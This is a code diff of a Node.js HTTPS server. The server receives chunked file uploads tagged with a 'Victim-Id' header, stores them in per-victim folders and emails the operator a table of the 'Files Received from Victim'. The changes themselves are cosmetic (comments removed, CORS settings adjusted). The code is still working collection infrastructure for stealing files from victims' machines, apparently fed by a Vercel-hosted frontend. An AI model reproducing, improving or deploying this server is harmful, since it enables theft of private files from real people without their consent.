@@ -4,25 +4,35 @@ const cors = require('cors');
 const express = require('express');
 const https = require('https');
 const nodemailer = require('nodemailer');
-const path = require('path'); // Add this import
+const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8443; // Use environment variable or default to 8443
+const PORT = process.env.PORT || 8443;
 
-// Load SSL certificate and key from environment variables
 const sslOptions = {
-  key: process.env.SSL_KEY,  // The private key from the Railway environment
-  cert: process.env.SSL_CERT // The certificate from the Railway environment
+  key: process.env.SSL_KEY,
+  cert: process.env.SSL_CERT
 };
 
-// CORS configuration - allow requests from your Vercel frontend URL
+// CORS Middleware
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*'); // Change '*' to your frontend domain if needed
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks');
+
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(204); // Respond to preflight request
+  }
+
+  next();
+});
+
+// Enable CORS with specific options
 const corsOptions = {
-  origin: '*',
+  origin: 'https://deoptestfrontend-q8ldtkgc8-2naseernoors-projects.vercel.app',
   methods: ['GET', 'POST'],
   allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
 };
-
-// Enable CORS with the custom options
 app.use(cors(corsOptions));
 
 // Middleware to handle raw binary data for file uploads
@@ -36,12 +46,11 @@ app.use((req, res, next) => {
 });
 
 // Base directory for storing files
-const OUTPUT_BASE_DIR = 'received_files'; 
+const OUTPUT_BASE_DIR = 'received_files';
 if (!fs.existsSync(OUTPUT_BASE_DIR)) {
   fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
 }
 
-// Nodemailer transporter setup (adjust for your email provider)
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
@@ -50,19 +59,17 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-// Helper function to send an email
 async function sendEmail(victimId, files) {
   console.log(`🔍 Preparing to send email for victim ${victimId}...`);
 
-  const fileRows = files
-    .map((file, index) =>
-      `<tr>
-        <td>${index + 1}</td>
-        <td>${file.name}</td>
-        <td>${file.type}</td>
-        <td>${file.size} bytes</td>
-      </tr>`
-    ).join('');
+  const fileRows = files.map((file, index) =>
+    `<tr>
+      <td>${index + 1}</td>
+      <td>${file.name}</td>
+      <td>${file.type}</td>
+      <td>${file.size} bytes</td>
+    </tr>`
+  ).join('');
 
   const htmlContent = `
     <h2>Files Received from Victim ${victimId}</h2>
@@ -92,13 +99,11 @@ async function sendEmail(victimId, files) {
   }
 }
 
-// Store victim data
 const victimFolders = {};
 const victimFileCounts = {};
 const victimTotalFiles = {};
 const victimFiles = {};
 
-// Function to check if all files are uploaded
 async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
@@ -115,7 +120,6 @@ async function checkAndSendEmail(victimId, victimFolder) {
   }
 }
 
-// Endpoint to handle file uploads
 app.post('/upload', (req, res) => {
   let filename = decodeURIComponent(req.headers['filename']);
   let victimId = decodeURIComponent(req.headers['victim-id']);
@@ -145,7 +149,6 @@ app.post('/upload', (req, res) => {
   });
 });
 
-// Start the HTTPS server
 https.createServer(sslOptions, app).listen(PORT, () => {
   console.log(`🔐 HTTPS server is running on https://localhost:${PORT}`);
 });
